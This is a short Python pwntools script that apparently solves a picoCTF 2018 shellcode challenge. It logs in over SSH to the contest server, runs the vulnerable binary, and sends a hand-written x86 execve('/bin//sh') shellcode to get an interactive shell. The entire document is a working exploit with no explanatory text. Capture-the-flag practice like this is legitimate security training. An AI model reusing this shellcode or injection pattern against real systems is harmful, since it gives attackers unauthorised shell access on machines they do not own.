from pwn import *

s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='')

p = s.process('/problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd/vuln')

scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print p.recv(1024)
p.sendline(scode)
p.recv(1024)
p.interactive()
